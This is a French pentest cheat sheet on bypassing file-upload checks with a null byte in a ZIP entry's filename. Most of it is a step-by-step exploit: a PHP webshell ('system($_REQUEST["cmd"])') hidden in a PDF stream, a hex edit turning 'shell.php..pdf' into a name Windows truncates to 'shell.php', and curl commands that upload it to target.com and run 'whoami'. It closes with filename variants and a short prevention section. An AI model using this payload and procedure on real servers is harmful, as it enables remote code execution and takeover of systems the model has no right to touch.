# Null Byte Injection

### <mark style="color:red;">File Upload - Null Byte Injection</mark>

#### <mark style="color:green;">📋 Description</mark>

Technique permettant de bypass les validations de fichiers en injectant un byte null (`\x00`) dans le nom de fichier. L'exploitation tire profit des différences de parsing entre :

* Le **parser PHP** qui lit le nom depuis un ZIP
* Le **système de fichiers Windows** qui tronque au null byte

#### <mark style="color:green;">🎯 Prérequis</mark>

* Upload de fichiers ZIP accepté
* Validation côté serveur basée sur l'extension
* Possibilité de manipuler le contenu du ZIP en hex

#### <mark style="color:green;">🔍 Principe technique</mark>

**Comportement du null byte**

```
Fichier dans ZIP : shell.php\x00.pdf
                           ↓
Parser PHP lit   : shell.php .pdf  (nom complet)
Windows écrit    : shell.php       (tronqué au \x00)
                           ↓
Résultat : fichier PHP exécutable sur le serveur !
```

#### <mark style="color:green;">⚔️ Exploitation</mark>

**Étape 1 : Créer un payload valide**

```bash
# Créer un PDF avec code PHP injecté
cp legitimate.pdf shell.php.pdf

# Éditer le PDF avec vim en mode binaire
vim shell.php.pdf

# Ajouter le payload PHP dans un stream du PDF
# (pour que le fichier reste un PDF valide)
%PDF-1.4
2 0 obj
<</Length 3 0 R/Filter/FlateDecode>>
stream
<?php system($_REQUEST["cmd"]); ?>
endstream
```

**Étape 2 : Créer le ZIP**

```bash
# Renommer avec doubles points
cp shell.php.pdf shell.php..pdf

# Créer le ZIP
zip exploit.zip shell.php..pdf
```

**Étape 3 : Injecter le null byte**

```bash
# Ouvrir le ZIP dans un éditeur hex (hexcurse, hexedit, xxd)
hexedit exploit.zip

# Localiser le filename : shell.php..pdf
# Remplacer le premier point par un null byte (0x00)
# 
# AVANT : 73 68 65 6C 6C 2E 70 68 70 2E 2E 70 64 66
#         s  h  e  l  l  .  p  h  p  .  .  p  d  f
#
# APRÈS : 73 68 65 6C 6C 00 70 68 70 2E 2E 70 64 66  
#         s  h  e  l  l \0  p  h  p  .  .  p  d  f

# ⚠️ IMPORTANT : Modifier aux 2 endroits dans le ZIP :
# - File header (début du ZIP)
# - Central directory (fin du ZIP)
```

**Étape 4 : Upload et exploitation**

```bash
# Upload du ZIP modifié
curl -X POST -F "file=@exploit.zip" http://target.com/upload.php

# Accéder au webshell
curl "http://target.com/uploads/HASH/shell.php?cmd=whoami"
```

#### <mark style="color:green;">🧪 Vérification locale</mark>

```bash
# Vérifier avec unzip (ne voit pas le null byte)
unzip -l exploit.zip
# Affiche : shell.php..pdf

# Vérifier avec PHP (voit le null byte)
php -r '$z = new ZipArchive(); $z->open("exploit.zip"); echo $z->getNameIndex(0);'
# Affiche : shell.php .pdf (avec espace)
```

#### <mark style="color:green;">⚠️ Variations possibles</mark>

**Variante 1 : Null byte + extension valide**

```
shell.php\x00.pdf.pdf
→ Windows écrit : shell.php
```

**Variante 2 : Multiple null bytes**

```
shell.php\x00\x00\x00.pdf
→ Peut contourner certaines validations
```

**Variante 3 : Caractères spéciaux combinés**

```
shell.php%00.pdf  (URL encoded)
shell.php\x00\x20.pdf  (null + espace)
```

#### <mark style="color:green;">🛡️ Détection/Prévention</mark>

**Côté serveur**

```php
// MAUVAIS : Validation insuffisante
if (pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION) === 'pdf') {
    // Vulnérable au null byte
}

// BON : Validation stricte
$filename = str_replace(chr(0), '', $_FILES['file']['name']); // Supprimer \x00
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);

// Whitelist stricte
$allowed_mimes = ['application/pdf'];
if (!in_array($mime, $allowed_mimes, true)) {
    die('Invalid file type');
}

// Renommer le fichier de façon sécurisée
$safe_filename = bin2hex(random_bytes(16)) . '.pdf';
```

**Protection supplémentaire**

* Ne jamais faire confiance au nom de fichier client
* Toujours générer un nom aléatoire côté serveur
* Vérifier le magic bytes du fichier
* Stocker les uploads hors de webroot si possible
* Désactiver l'exécution PHP dans le dossier uploads

#### <mark style="color:green;">📚 Références</mark>

* [OWASP File Upload Vulnerabilities](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
* [Null Byte Injection Explained](https://defendtheweb.net/article/common-php-attacks-poison-null-byte)
